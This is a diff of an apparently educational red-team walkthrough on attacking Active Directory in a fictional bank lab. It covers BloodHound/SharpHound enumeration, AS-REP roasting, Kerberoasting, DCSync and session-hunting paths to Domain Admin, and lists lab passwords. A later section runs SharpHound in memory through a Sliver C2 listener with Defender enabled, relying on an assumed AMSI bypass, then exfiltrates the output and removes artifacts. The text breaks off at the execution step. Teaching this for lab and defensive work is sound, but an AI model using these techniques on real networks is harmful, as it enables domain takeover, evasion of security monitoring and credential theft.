-└── Policy: Password must be 16 characters + MFA required
-
-
-This is done through GROUP POLICY OBJECTS (GPOs).
-GPOs link to OUs and apply settings to everything inside.
+└── CN=Computers                  ← Domain computers
+    ├── CN=WS01
+    └── CN=WS02
 ```
 
 ---
 
-# PART 8: Group Memberships {#part-8-groups}
+## Part 2.3: Group Memberships and Nesting
 
-## Groups Can Contain Groups (Nesting!)
-
-```
-GROUPS CAN BE NESTED:
-────────────────────────────────────────────────────────────────
-
-GROUP: Domain Admins
-├── ammulu.orsu         ← Direct member (this is a Domain Admin!)
-└── GROUP: Server_Admins    ← Nested group!
-    └── kiran.kumar     ← kiran is in Server_Admins
-                            which is in Domain Admins
-                            so kiran IS a Domain Admin!
-
-
-THIS IS CRITICAL FOR ATTACKERS:
-───────────────────────────────
-
-You might look at Domain Admins and see only 1 user (ammulu.orsu).
-But if you trace the nested groups, you might find:
-
-Domain Admins
-└── Server_Admins
-    └── IT_Support
-        └── HelpDesk_Team
-            └── vamsi.krishna    ← Wait... vamsi is actually a Domain Admin
-                                    through 4 levels of nesting!
-
-BloodHound finds these hidden paths automatically!
-```
-
-## Important Built-in Groups
+### THE HIDDEN ATTACK PATH IN ORSUBANK
 
 ```
-WINDOWS HAS BUILT-IN GROUPS WITH SPECIAL POWERS:
+ORSUBANK HAS A DANGEROUS NESTED GROUP CHAIN:
 ────────────────────────────────────────────────────────────────
 
-GROUP                   │  POWER LEVEL  │  WHAT THEY CAN DO
+THE ATTACK PATH YOU'LL FIND WITH BLOODHOUND:
+
+                      ┌─────────────────┐
+                      │  Domain Admins  │  ← Ultimate goal!
+                      │                 │
+                      │ Direct Members: │
+                      │ - ammulu.orsu   │
+                      │ - svc_backup    │
+                      │ - Server_Admins │ ←── Nested group!
+                      └────────┬────────┘
+                               │
+                               │ (is member of)
+                               │
+                      ┌────────┴────────┐
+                      │  Server_Admins  │
+                      │                 │
+                      │ Members:        │
+                      │ - IT_Support    │ ←── Another nested group!
+                      └────────┬────────┘
+                               │
+                               │ (is member of)
+                               │
+                      ┌────────┴────────┐
+                      │   IT_Support    │
+                      │                 │
+                      │ Members:        │
+                      │ - HelpDesk_Team │ ←── Yet another!
+                      └────────┬────────┘
+                               │
+                               │ (is member of)
+                               │
+                      ┌────────┴────────┐
+                      │ HelpDesk_Team   │
+                      │                 │
+                      │ Members:        │
+                      │ - harsha.vardhan│ ← REGULAR USER!
+                      └─────────────────┘
+
+
+THE RESULT:
+───────────
+harsha.vardhan appears to be a regular "Customer Service Manager"
+but through GROUP NESTING, he is EFFECTIVELY A DOMAIN ADMIN!
+
+harsha.vardhan → HelpDesk_Team → IT_Support → Server_Admins → Domain Admins
+
+BloodHound will show you this path automatically!
+```
+
+### Why This Matters
+
+```
+ATTACKER'S VIEW:
 ────────────────────────────────────────────────────────────────
-Domain Admins          │  ⭐⭐⭐⭐⭐     │  EVERYTHING in the domain!
-Enterprise Admins      │  ⭐⭐⭐⭐⭐     │  Everything in the FOREST!
-Administrators         │  ⭐⭐⭐⭐       │  Local admin on DCs
-Account Operators      │  ⭐⭐⭐         │  Can create/modify users
-Server Operators       │  ⭐⭐⭐         │  Can log into DCs, manage services
-Backup Operators       │  ⭐⭐           │  Can backup files (bypass permissions!)
-Print Operators        │  ⭐⭐           │  Can manage printers
-Domain Users           │  ⭐             │  Basic authenticated users
 
+1. You AS-REP Roast harsha.vardhan (no pre-auth required)
+2. You crack his password: Customer2024!
+3. You now have Domain Admin through nested groups!
 
-ATTACKER'S GOAL:
-─────────────────
-Start as: Domain Users (vamsi.krishna - regular employee)
-End as:   Domain Admins (complete control!)
+Without BloodHound, you'd never know harsha.vardhan was DA!
+His account looks completely normal:
+- Title: Customer Service Manager
+- Department: Customer Service
+- Not directly in Domain Admins
 
-We use enumeration to find a PATH from one to the other!
+BloodHound reveals hidden paths like this!
 ```
 
 ---
 
-# PART 9: Permissions and ACLs {#part-9-permissions}
+## Part 2.4: Permissions and ACLs
 
-## Every Object Has Permissions (Who Can Do What)
+### The DCSync Vulnerability on WS01
 
 ```
-ACL = ACCESS CONTROL LIST = LIST OF PERMISSIONS
+ORSUBANK HAS A DANGEROUS MISCONFIGURATION:
 ────────────────────────────────────────────────────────────────
 
-Every AD object has an ACL that says:
-- WHO can access it
-- WHAT they can do to it
+WS01$ (the computer account for Workstation 1) has been given
+REPLICATION RIGHTS on the domain!
 
-EXAMPLE: User object "lakshmi.devi"
+This means: If you get SYSTEM on WS01, you can DCSync!
 
-ACL for lakshmi.devi:
-────────────────────────────────────────────────────────────────
-WHO                    │  WHAT THEY CAN DO
-────────────────────────────────────────────────────────────────
-SELF                   │  Change own password
-Domain Admins          │  Full Control (anything!)
-Account Operators      │  Reset password, modify attributes
-vamsi.krishna          │  GenericAll ← WAIT... why does vamsi
-                       │               have full control over
-                       │               lakshmi's account?!
+WHAT IS DCSYNC?
+───────────────
+DCSync = Pretending to be a Domain Controller
+         and asking for password hashes
 
-THIS IS A MISCONFIGURATION!
-If vamsi.krishna is compromised, attacker can:
-- Reset lakshmi's password
-- Take over lakshmi's account
-- If lakshmi is a Domain Admin... GAME OVER!
-```
-
-## Dangerous Permissions
-
-```
-LDAP IS HOW WE GATHER INFORMATION:
-────────────────────────────────────────────────────────────────
-
-With valid domain credentials (even just a regular user!), we can:
-
-1. List ALL users in the domain
-2. List ALL groups and their members
-3. List ALL computers
-4. See permissions on objects
-5. Find misconfigurations!
-
-THIS IS CALLED ENUMERATION!
-
-Tools that use LDAP:
-- BloodHound (via SharpHound)
-- PowerView
-- ldapsearch
-- ADExplorer
-
-Any domain user can read most of AD by default!
-```
-
----
-
-# PART 11: What is Kerberos? {#part-11-kerberos}
-
-## Kerberos = The Authentication Protocol
-
-Kerberos is the authentication system used in Active Directory. When you log in to your Windows workstation, Kerberos handles the authentication.
-
-**Why is it called Kerberos?**
-
-Kerberos is named after the three-headed dog from Greek mythology that guards the underworld. The protocol has three main components:
-1. The Client (you)
-2. The Server (what you want to access)
-3. The KDC (Key Distribution Center - the DC)
-
-**How Kerberos Authentication Works (Simplified):**
-
-```
-YOU WANT TO ACCESS A FILE SERVER:
-────────────────────────────────────────────────────────────────
-
-Step 1: YOU -> DC (KDC)
-        "I'm vamsi.krishna, here's proof I know my password"
-        
-        DC checks password, gives you a TGT (Ticket Granting Ticket)
-        Think of TGT as a "day pass" that proves who you are
-
-Step 2: YOU -> DC (KDC)  
-        "I have this TGT, I want to access FileServer01"
-        
-        DC gives you a Service Ticket for FileServer01
-
-Step 3: YOU -> FILE SERVER
-        "Here's my Service Ticket for you"
-        
-        FileServer01 accepts the ticket, lets you in!
+Normal: Only DC01 has replication rights
+Vuln:   WS01$ also has replication rights (misconfiguration!)
 
 
-KEY CONCEPT:
-─────────────
-After initial login, you NEVER send your password again!
-You only send tickets. This is more secure.
-```
-
-**Why Attackers Care About Kerberos:**
-
-| Kerberos Weakness | Attack Name | What it does |
-|-------------------|-------------|--------------|
-| Service accounts have weak passwords | Kerberoasting | Crack service account passwords offline |
-| Pre-authentication can be disabled | AS-REP Roasting | Get password hashes without authentication |
-| TGT can be forged if krbtgt hash is known | Golden Ticket | Unlimited access forever |
-| Service tickets can be forged | Silver Ticket | Access specific services |
-
-We will cover these attacks in later walkthroughs!
-
----
-
-# PART 12: How Authentication Works {#part-12-authentication}
-
-## The Complete Login Flow
-
-When you sit at a Windows workstation and log in, here's what happens:
-
-```
-COMPLETE LOGIN FLOW:
-────────────────────────────────────────────────────────────────
-
-1. You type username and password at WS01
-   
-2. WS01 sends authentication request to DC01 (Kerberos AS-REQ)
-   
-3. DC01 checks:
-   - Does this user exist? 
-   - Is the password correct?
-   - Is the account enabled?
-   - Is the account locked?
-   
-4. DC01 returns a TGT (Ticket Granting Ticket)
-   - This TGT is encrypted with krbtgt hash
-   - Only the DC can create/validate TGTs
-   
-5. WS01 caches the TGT in memory (LSASS process)
-   - The TGT is valid for 10 hours by default
-   
-6. When you access resources, WS01 uses TGT to get Service Tickets
-   
-7. Service Tickets are presented to access resources
-
-IMPORTANT FOR ATTACKERS:
-────────────────────────
-- TGTs are cached in LSASS memory
-- If we dump LSASS, we get tickets!
-- Pass-the-Ticket attacks use stolen tickets
-- Golden Ticket forges a TGT (game over!)
-```
-
----
-
-# PART 13: Why Attackers Care About AD {#part-13-attacker-view}
-
-## AD is the Keys to the Kingdom
-
-**From an attacker's perspective, Active Directory is the most valuable target because:**
-
-```
-WHY AD IS THE ULTIMATE TARGET:
-────────────────────────────────────────────────────────────────
-
-1. CENTRALIZED CONTROL
-   - One system controls ALL user access
-   - Compromise AD = Compromise everything
-   
-2. EVERYONE USES IT
-   - 95%+ of enterprises use AD
-   - Banks, hospitals, governments, everything!
-   
-3. RICH ATTACK SURFACE
-   - Kerberos weaknesses (Kerberoasting, AS-REP)
-   - Trust relationships
-   - ACL misconfigurations
-   - Credential storage
-   
-4. CREDENTIAL REUSE
-   - Users often have same password everywhere
-   - Service accounts rarely change passwords
-   - Admin accounts get used on multiple machines
-   
-5. PERSISTENCE
-   - Once you're Domain Admin, you can create backdoors
-   - Golden Tickets last 10 years by default!
-   - Very hard to fully remove an attacker
-```
-
-## The Attack Chain
-
-```
-TYPICAL AD ATTACK PROGRESSION:
-────────────────────────────────────────────────────────────────
-
-[Initial Access] -> [Enumeration] -> [Privilege Escalation] -> [Domain Admin]
-
-1. INITIAL ACCESS
-   Get foothold on ONE machine with domain credentials
-   (Phishing, exploit, stolen creds, etc.)
-   
-2. ENUMERATION  <-- THIS IS WHERE WE ARE NOW!
-   Map out the domain - who has what permissions?
-   Find attack paths to Domain Admin
-   
-3. PRIVILEGE ESCALATION  
-   Follow the path - exploit misconfigs
-   Kerberoast, ACL abuse, credential theft
-   
-4. LATERAL MOVEMENT
-   Move from machine to machine
-   Following the path to your target
-   
-5. DOMAIN ADMIN
-   Complete control of the domain
-   DCSync to dump all credentials
-   Create persistence (Golden Ticket)
-```
-
----
-
-# PART 14: What is Enumeration? {#part-14-enumeration}
-
-## Enumeration = Mapping the Network
-
-**Enumeration is the process of gathering information about a target.**
-
-In AD enumeration, we want to discover:
-- All users and their properties
-- All groups and their memberships
-- All computers
-- Trust relationships
-- ACL configurations (who can do what to whom)
-- Logged-on users (who is where)
-- Sessions and local admins
-
-**Why Enumeration is Critical:**
-
-```
-ANALOGY: ROBBING A BANK
-────────────────────────────────────────────────────────────────
-
-WITHOUT ENUMERATION:
-- Walk into random bank
-- Don't know where vault is
-- Don't know guard schedules
-- Don't know alarm systems
-- Get caught immediately
-
-WITH ENUMERATION:
-- Study the bank for weeks
-- Know every entrance and exit
-- Know when guards change shifts
-- Know how alarms work
-- Precise, surgical strike
-
-AD ENUMERATION TELLS US:
-- Where are the high-value targets? (Domain Admins)
-- What paths lead to those targets?
-- What's the easiest path?
-- What credentials do we need?
-```
-
-## What We Enumerate
-
-| What | Why we care | How we get it |
-|------|-------------|---------------|
-| Users | Find high-privilege accounts | LDAP queries |
-| Groups | Find who has what access | LDAP queries |
-| Computers | Find targets for lateral movement | LDAP queries |
-| Sessions | Find where admins are logged in | NetSessionEnum |
-| Local Admins | Find paths for lateral movement | Remote registry/WMI |
-| ACLs | Find privilege escalation paths | LDAP queries |
-| Trusts | Find paths to other domains | LDAP queries |
-
----
-
-# PART 15: Attack Paths {#part-15-attack-paths}
-
-## What is an Attack Path?
-
-**An attack path is a chain of misconfigurations that leads to a target.**
-
-```
-EXAMPLE ATTACK PATH:
-────────────────────────────────────────────────────────────────
-
-YOU START AS: vamsi.krishna (regular Domain User)
-
-PATH DISCOVERED:
+THE ATTACK PATH:
 ────────────────
 
-vamsi.krishna
-    |
-    | [GenericAll on lakshmi.devi]
-    v
-lakshmi.devi
-    |
-    | [Member of IT_Support]
-    v
-IT_Support (group)
-    |
-    | [AdminTo WS02]
-    v
-WS02 (computer)
-    |
-    | [pranavi is logged in here]
-    v
-pranavi (has session on WS02)
-    |
-    | [Member of Domain Admins]
-    v
-Domain Admins!!!
+1. You compromise WS01 (where vamsi.krishna logs in)
+2. You escalate to SYSTEM on WS01
+3. Using WS01$'s computer account, you DCSync
+4. You get the hash for Administrator
+5. You own the domain!
 
-THE ATTACK:
-───────────
-1. vamsi resets lakshmi's password (GenericAll permission)
-2. Log in as lakshmi
-3. As lakshmi (IT_Support), access WS02 as local admin
-4. On WS02, dump credentials from memory
-5. Find pranavi's credentials (she's logged in)
-6. Log in as pranavi
-7. pranavi is Domain Admin = WIN!
+[WS01 SYSTEM] ──DCSync──► [DC01] ──"Here are all hashes"──► [Attacker]
 ```
-
-**BloodHound automatically finds these paths!**
 
 ---
 
-# PART 16: What is BloodHound? {#part-16-bloodhound}
-
-## BloodHound = Attack Path Visualization Tool
-
-**BloodHound is a tool that:**
-1. Collects data about Active Directory (using SharpHound)
-2. Analyzes relationships between objects
-3. Finds attack paths to high-value targets
-4. Visualizes paths as graphs
-
-**BloodHound Components:**
-
-| Component | What it is | Where it runs |
-|-----------|-----------|---------------|
-| **SharpHound** | Data collector (.exe or .ps1) | On compromised Windows machine |
-| **BloodHound GUI** | Analysis and visualization tool | On your attack machine (Kali) |
-| **Neo4j** | Graph database | Stores the collected data |
-
-**Who Made BloodHound?**
-
-BloodHound was created by:
-- Andy Robbins (@_wald0)
-- Rohan Vazarkar (@CptJesus)
-- Will Schroeder (@harmj0y)
-
-It was released at DEF CON 24 (2016) and has become THE standard tool for AD enumeration.
+# PART 3: HOW AD COMMUNICATES
 
 ---
 
-# PART 17: How BloodHound Works {#part-17-how-bloodhound}
-
-## The Collection and Analysis Process
+## Part 3.1: What is LDAP?
 
 ```
-BLOODHOUND WORKFLOW:
+LDAP = LIGHTWEIGHT DIRECTORY ACCESS PROTOCOL
 ────────────────────────────────────────────────────────────────
 
-STEP 1: RUN SHARPHOUND ON COMPROMISED MACHINE
-        |
-        | SharpHound queries Active Directory via LDAP
-        | Collects users, groups, computers, ACLs, sessions
-        |
-        v
-STEP 2: GET THE OUTPUT FILE
-        |
-        | SharpHound creates a .zip file with JSON data
-        | Transfer this file to your attack machine
-        |
-        v
+LDAP is how programs TALK to Active Directory.
+
+When you run BloodHound/SharpHound, it uses LDAP to ask:
+- "Give me all users"
+- "Give me all groups"
+- "What groups is harsha.vardhan in?"
+- "What permissions does WS01$ have?"
+
+
+LDAP QUERY EXAMPLE:
+───────────────────
+
+Q: "Give me all users who don't require pre-authentication"
+   (Filter: userAccountControl:1.2.840.113556.1.4.803:=4194304)
+
+A: pranavi, harsha.vardhan, kiran.kumar
+   ↑ These are AS-REP Roastable!
+
+
+LDAP runs on:
+- Port 389 (unencrypted)
+- Port 636 (encrypted/LDAPS)
+
+In ORSUBANK:
+- DC01:389 is the LDAP server
+- All queries go through DC01
+```
+
+---
+
+## Part 3.2: What is Kerberos?
+
+```
+KERBEROS = THE AUTHENTICATION PROTOCOL
+────────────────────────────────────────────────────────────────
+
+Instead of sending passwords over the network, Windows uses
+TICKETS to prove identity. This is Kerberos.
+
+HOW IT WORKS (Simplified):
+──────────────────────────
+
+1. vamsi.krishna wants to access a file server
+2. Instead of sending password, vamsi asks DC01 for a TICKET
+3. DC01 gives vamsi a ticket (encrypted with vamsi's password hash)
+4. vamsi presents the ticket to the file server
+5. File server trusts DC01, so it accepts the ticket
+
+
+WHY THIS MATTERS FOR ATTACKS:
+─────────────────────────────
+
+KERBEROASTING:
+- Service accounts have SPNs (Service Principal Names)
+- Anyone can request a ticket for a service
+- The ticket is encrypted with the service's password
+- You can crack the ticket offline to get the password!
+
+ORSUBANK vulnerable accounts:
+- sqlservice (SPN: MSSQLSvc/DC01:1433)
+- httpservice (SPN: HTTP/web.orsubank.local)
+- iisservice (SPN: HTTP/app.orsubank.local)
+- backupservice (SPN: MSSQLSvc/DC01:1434)
+- svc_backup (SPN: backup/dc01.orsubank.local) ← This one is DA!
+
+
+AS-REP ROASTING:
+- Normally, you must prove your password before getting a ticket
+- Some accounts have "Do not require Kerberos pre-authentication"
+- For those, you can get an encrypted response without knowing password
+- Crack it offline!
+
+ORSUBANK vulnerable accounts:
+- pranavi (password: Branch123!)
+- harsha.vardhan (password: Customer2024!)
+- kiran.kumar (password: Finance1!)
+```
+
+---
+
+## Part 3.3: How Authentication Works
+
+```
+AUTHENTICATION FLOW IN ORSUBANK:
+────────────────────────────────────────────────────────────────
+
+SCENARIO: vamsi.krishna logs into WS01
+
+STEP 1: vamsi types credentials at WS01
+        Username: vamsi.krishna
+        Password: B@nkM@nager2024!
+
+STEP 2: WS01 sends AS-REQ to DC01
+        "I'm vamsi.krishna, give me a ticket"
+
+STEP 3: DC01 checks if vamsi exists and password is correct
+        If yes → sends back AS-REP (contains TGT)
+
+STEP 4: vamsi now has a Ticket-Granting Ticket (TGT)
+        This is his "proof of identity" for the next 10 hours
+
+STEP 5: When vamsi wants to access something:
+        - He asks DC01 for a Service Ticket (TGS-REQ)
+        - DC01 gives him a ticket for that service
+        - He presents the ticket to the service
+
+
+         vamsi.krishna                DC01                 File Server
+              │                         │                       │
+              │ ──AS-REQ───────────────►│                       │
+              │ (username + timestamp)   │                       │
+              │                         │                       │
+              │ ◄──AS-REP───────────────│                       │
+              │ (TGT - encrypted)       │                       │
+              │                         │                       │
+              │ ──TGS-REQ──────────────►│                       │
+              │ (I want file server)    │                       │
+              │                         │                       │
+              │ ◄──TGS-REP──────────────│                       │
+              │ (Service ticket)        │                       │
+              │                         │                       │
+              │ ──────Service Ticket────────────────────────────►│
+              │                                                  │
+              │ ◄──────Access Granted────────────────────────────│
+              │                                                  │
+```
+
+---
+
+# PART 4: THE ATTACKER'S PERSPECTIVE
+
+---
+
+## Part 4.1: Why Attackers Care About AD
+
+```
+ACTIVE DIRECTORY IS THE GOLDEN TARGET:
+────────────────────────────────────────────────────────────────
+
+In ORSUBANK:
+
+IF YOU GET DOMAIN ADMIN:
+├── You control all 10+ user accounts
+├── You control all computers (DC01, WS01, WS02)
+├── You can access all files
+├── You can read all emails
+├── You can access customer banking data
+├── You can create backdoors
+├── You can steal credentials
+└── You own the entire bank's IT infrastructure!
+
+
+THE DOMAIN ADMIN GOAL:
+──────────────────────
+
+START:  You are vamsi.krishna
+        Regular "Bank Manager"
+        Can only access what a bank manager should access
+
+GOAL:   Become Domain Admin
+        ammulu.orsu, svc_backup, or effectively through groups
+
+HOW:    Find ATTACK PATHS using BloodHound!
+```
+
+---
+
+## Part 4.2: What is Enumeration?
+
+```
+ENUMERATION = GATHERING INFORMATION
+────────────────────────────────────────────────────────────────
+
+Before attacking, we need to understand what exists:
+
+QUESTIONS WE WANT ANSWERED:
+───────────────────────────
+
+1. WHO are the Domain Admins?
+   → ammulu.orsu (directly)
+   → svc_backup (directly)
+   → harsha.vardhan (through nested groups)
+
+2. WHO has "Do not require preauth"?
+   → pranavi, harsha.vardhan, kiran.kumar
+   → These can be AS-REP Roasted!
+
+3. WHAT service accounts have SPNs?
+   → sqlservice, httpservice, iisservice, backupservice, svc_backup
+   → These can be Kerberoasted!
+
+4. WHO is logged into which computer?
+   → vamsi.krishna on WS01
+   → lakshmi.devi (DA) sometimes on WS01 ← Session to steal!
+
+5. WHAT computers have special permissions?
+   → WS01$ has DCSync rights!
+
+6. WHAT path can I take from my current user to DA?
+   → THIS IS WHAT BLOODHOUND ANSWERS!
+```
+
+---
+
+## Part 4.3: Attack Paths Explained
+
+```
+ATTACK PATHS IN ORSUBANK:
+────────────────────────────────────────────────────────────────
+
+PATH 1: AS-REP ROAST → NESTED GROUPS → DA
+─────────────────────────────────────────
+
+1. Get harsha.vardhan's AS-REP hash (no auth required!)
+2. Crack it: Customer2024!
+3. Login as harsha.vardhan
+4. harsha is in HelpDesk_Team → IT_Support → Server_Admins → DA!
+5. You ARE Domain Admin!
+
+
+PATH 2: KERBEROAST svc_backup → DA
+──────────────────────────────────
+
+1. Request TGS ticket for svc_backup's SPN
+2. Crack it: Backup@2024!
+3. Login as svc_backup
+4. svc_backup is directly in Domain Admins!
+5. You ARE Domain Admin!
+
+
+PATH 3: COMPROMISE WS01 → DCSYNC → DA
+─────────────────────────────────────
+
+1. Get shell on WS01 (via vamsi.krishna)
+2. Escalate to SYSTEM
+3. Use WS01$'s replication rights to DCSync
+4. Get Administrator's NTLM hash
+5. Pass-the-hash as Administrator
+6. You ARE Domain Admin!
+
+
+PATH 4: SESSION HUNTING → CREDENTIAL THEFT → DA
+───────────────────────────────────────────────
+
+1. Get shell on WS01 (via vamsi.krishna)
+2. Wait for lakshmi.devi (DA) to log in
+3. Dump her credentials from memory
+4. Use her credentials
+5. You ARE Domain Admin!
+
+
+BloodHound will SHOW YOU all these paths visually!
+```
+
+---
+
+# PART 5: BLOODHOUND FUNDAMENTALS
+
+---
+
+## Part 5.1: What is BloodHound?
+
+```
+BLOODHOUND = AD ATTACK PATH VISUALIZER
+────────────────────────────────────────────────────────────────
+
+BloodHound is a tool that:
+1. Collects AD data (using SharpHound)
+2. Stores it in a graph database (Neo4j)
+3. Visualizes relationships and attack paths
+
+INSTEAD OF:
+──────────
+Manually checking every user, group, permission...
+"Is harsha.vardhan in any groups?"
+"What groups are those groups in?"
+"Do any of those lead to DA?"
+... (This would take HOURS)
+
+WITH BLOODHOUND:
+────────────────
+Click "Shortest Paths to Domain Admins from Owned Principals"
+→ See VISUAL PATH: harsha.vardhan → HelpDesk → IT_Support → Server_Admins → DA
+
+In seconds, not hours!
+
+
+WHY IT'S CALLED BLOODHOUND:
+───────────────────────────
+Like a bloodhound dog tracking a scent...
+BloodHound tracks the "scent" of privilege through AD!
+```
+
+---
+
+## Part 5.2: How BloodHound Works
+
+```
+THE BLOODHOUND WORKFLOW:
+────────────────────────────────────────────────────────────────
+
+STEP 1: RUN SHARPHOUND (Data Collection)
+────────────────────────────────────────
+On compromised machine (WS01 in our lab):
+> SharpHound.exe -c All
+
+This queries AD via LDAP and collects:
+- All users
+- All groups
+- All computers
+- Group memberships
+- Sessions (who's logged in where)
+- ACLs (permissions)
+
+
+STEP 2: EXFILTRATE THE DATA
+───────────────────────────
+SharpHound creates a ZIP file:
+> 20241229_BloodHound.zip
+
+Transfer this to your Kali machine.
+
+
 STEP 3: IMPORT INTO BLOODHOUND
-        |
-        | Start Neo4j database
-        | Start BloodHound GUI
-        | Upload the .zip file
-        |
-        v
-STEP 4: ANALYZE AND FIND PATHS
-        |
-        | Mark your owned accounts
-        | Run queries to find paths
-        | Visualize attack paths
-        |
-        v
-STEP 5: EXECUTE THE ATTACK
-        Follow the path BloodHound found!
+──────────────────────────────
+BloodHound (on Kali) reads the ZIP and populates Neo4j.
+
+Now all the data is in a graph database!
+
+
+STEP 4: QUERY FOR ATTACK PATHS
+──────────────────────────────
+Click pre-built queries or write custom ones:
+- "Find all Domain Admins"
+- "Shortest Paths to Domain Admins"
+- "Kerberoastable Accounts"
+- "AS-REP Roastable Users"
+- "Users with DCSync Rights"
 ```
-
-## What Data Does SharpHound Collect?
-
-| Collection Method | What it collects | How |
-|-------------------|------------------|-----|
-| **Default** | Users, Groups, Computers, Trusts, ACLs | LDAP |
-| **Session** | Who is logged in where | NetSessionEnum, Registry |
-| **LocalAdmin** | Who has local admin on computers | Remote Registry, WMI |
-| **All** | Everything above | All methods |
 
 ---
 
-# PART 18: SharpHound - The Data Collector {#part-18-sharphound}
-
-## SharpHound Versions
-
-**SharpHound.exe** - Compiled executable (.exe)
-- Easier to run
-- Can be detected by AV
-- Used with Sliver's execute-assembly
-
-**SharpHound.ps1** - PowerShell script
-- More flexible
-- Easily caught by AMSI
-- Needs AMSI bypass first
-
-## SharpHound Collection Methods
+## Part 5.3: SharpHound - The Data Collector
 
 ```
-SHARPHOUND COLLECTION OPTIONS:
+SHARPHOUND OPTIONS:
 ────────────────────────────────────────────────────────────────
 
---CollectionMethods (or -c):
+SharpHound.exe [options]
 
-DEFAULT          Basic collection (fast, safe)
-                 Users, Groups, Computers, Trusts, ACLs
+COLLECTION METHODS (-c):
+────────────────────────
+-c All          → Collect everything (recommended for first run)
+-c Default      → Most common data (users, groups, sessions)
+-c Group        → Only group memberships
+-c Session      → Only active sessions
+-c LoggedOn     → Who's logged on to computers
+-c ACL          → Access control lists
+-c ObjectProps  → Object properties
 
-GROUP            Just group membership info
+ORSUBANK EXAMPLE:
+─────────────────
+For complete enumeration:
+> SharpHound.exe -c All
 
-SESSION          Current logged-on users (can be noisy!)
-
-LOCALADMIN       Who is local admin (requires admin rights on targets)
-
-TRUSTS           Domain trust relationships
-
-ACL              Access Control Lists (permissions)
-
-CONTAINER        OUs and GPO links
-
-ALL              Everything (slowest, most data, most noisy!)
+For just finding who's logged in where:
+> SharpHound.exe -c Session
 
 
-FOR OUR LAB, USE: --CollectionMethods All
+OUTPUT:
+───────
+SharpHound creates a ZIP file containing JSON files:
+- computers.json
+- users.json
+- groups.json
+- domains.json
+- sessions.json
+- ... etc
+
+This ZIP is what you import into BloodHound!
 ```
-
-## SharpHound Output
-
-When SharpHound finishes, it creates a .zip file containing:
-- `*_users.json` - All user objects
-- `*_computers.json` - All computer objects
-- `*_groups.json` - All groups and memberships
-- `*_domains.json` - Domain info and trusts
-- `*_gpos.json` - Group policies (if collected)
-- `*_ous.json` - Organizational units
 
 ---
 
-# PART 19: Lab Setup {#part-19-lab}
+# PART 6: PRACTICAL EXECUTION WITH SLIVER C2 (DEFENDER ENABLED!)
 
-## Prerequisites
+> **⚠️ CRITICAL: This section assumes Windows Defender is ENABLED.**
+> We will use evasion techniques, NOT disable Defender.
+> This is how real Red Teams operate!
 
-Before running BloodHound enumeration, you need:
+---
+
+## Part 6.1: Understanding The Challenge
 
 ```
-REQUIREMENTS:
+THE PROBLEM WITH RUNNING SHARPHOUND:
 ────────────────────────────────────────────────────────────────
 
-1. INITIAL ACCESS
-   - Beacon on a domain-joined Windows machine (WS01)
-   - You got this from the previous walkthrough!
-   
-2. DOMAIN CREDENTIALS
-   - Any valid domain user account
-   - Even the lowest-privilege user can enumerate!
-   
-3. TOOLS ON KALI
-   - Neo4j (graph database)
-   - BloodHound GUI
-   - SharpHound.exe (to transfer to target)
-   
-4. NETWORK ACCESS
-   - The compromised machine must be able to reach DC01
-   - LDAP (port 389) and other ports must be open
+If you just run SharpHound.exe on a machine with Defender:
+
+❌ Defender detects SharpHound.exe (known malware signature)
+❌ Your session gets killed
+❌ Alert sent to SOC
+❌ You're burned
+
+REAL RED TEAM APPROACH:
+────────────────────────────────────────────────────────────────
+
+✅ Use Sliver's execute-assembly (in-memory execution)
+✅ AMSI is already bypassed by our loader
+✅ Run from memory, no file on disk
+✅ Use stealth collection methods
+✅ Exfiltrate over encrypted C2 channel
+✅ Clean up artifacts
 ```
 
-## Installing BloodHound on Kali
+---
+
+## Part 6.2: Prerequisites - Your Sliver Session
+
+```
+WHAT YOU NEED:
+────────────────────────────────────────────────────────────────
+
+FROM THE INITIAL ACCESS WALKTHROUGH:
+─────────────────────────────────────
+You should have:
+
+1. Sliver server running on Kali (192.168.100.100)
+   $ sliver-server
+
+2. HTTPS listener on port 443
+   sliver > https --lhost 192.168.100.100 --lport 443
+
+3. Active session from WS01
+   sliver > sessions
+   
+   ID         Transport   Hostname   Username          OS
+   ────────   ─────────   ────────   ────────────────  ────────
+   abc123     https       WS01       ORSUBANK\vamsi.krishna   Windows
+
+4. Interact with session
+   sliver > use abc123
+   sliver (IMPLANT_NAME) >
+
+IF YOU DON'T HAVE THIS:
+───────────────────────
+Go back to 00_initial_access_sliver_setup.md and complete it first!
+```
+
+---
+
+## Part 6.3: Setting Up SharpHound for Evasion
+
+### Why execute-assembly is Stealthy
+
+```
+SLIVER'S EXECUTE-ASSEMBLY EXPLAINED:
+────────────────────────────────────────────────────────────────
+
+TRADITIONAL (DETECTED):
+─────────────────────────
+1. Upload SharpHound.exe to disk
+2. File touches disk → Defender scans it → DETECTED!
+3. Execute from disk → More signatures → DETECTED!
+
+SLIVER EXECUTE-ASSEMBLY (STEALTH):
+───────────────────────────────────
+1. SharpHound.exe stays on YOUR Kali machine
+2. Sliver sends it over encrypted C2 channel
+3. Sliver loads it directly into memory
+4. Executes from memory → No file on disk!
+5. AMSI already bypassed by our loader → No runtime detection!
+6. Output captured and sent back over C2
+
+┌──────────────┐     encrypted C2     ┌──────────────┐
+│    KALI      │ ◄───────────────────►│    WS01      │
+│              │   SharpHound bytes   │              │
+│ SharpHound.  │   (never touches     │ Loaded in    │
+│ exe stays    │    disk on WS01)     │ memory only  │
+│ here         │                      │              │
+└──────────────┘                      └──────────────┘
+```
+
+### Download SharpHound on Kali (Not on Target!)
 
 ```bash
-# Update package lists
-sudo apt update
+# On KALI (192.168.100.100) - NOT on WS01!
 
-# Install Neo4j (graph database that BloodHound uses)
-sudo apt install neo4j -y
+# Create tools directory
+mkdir -p /opt/red-team-tools
+cd /opt/red-team-tools
 
-# Install BloodHound
-sudo apt install bloodhound -y
+# Download SharpHound
+wget https://github.com/BloodHoundAD/SharpHound/releases/download/v2.0.0/SharpHound-v2.0.0.zip
+unzip SharpHound-v2.0.0.zip
 
-# Start Neo4j service
-sudo neo4j start
+# Verify
+ls -la SharpHound.exe
+# -rwxr-xr-x 1 kali kali 1234567 Dec 29 10:00 SharpHound.exe
 
-# Wait 30 seconds for Neo4j to start
-sleep 30
-
-# Access Neo4j web interface to set password
-# Open browser to: http://localhost:7474
-# Default credentials: neo4j / neo4j
-# You'll be prompted to set a new password (use: bloodhound)
+# This file STAYS ON KALI
+# We use execute-assembly to run it in-memory on WS01
 ```
 
-**First-time Neo4j Setup:**
+---
 
-1. Open browser: `http://localhost:7474`
-2. Login: `neo4j` / `neo4j`
-3. Set new password: `bloodhound`
+## Part 6.4: Running SharpHound via Sliver (In-Memory)
 
-**Start BloodHound:**
+### Step 6.4.1: Basic In-Memory Execution
+
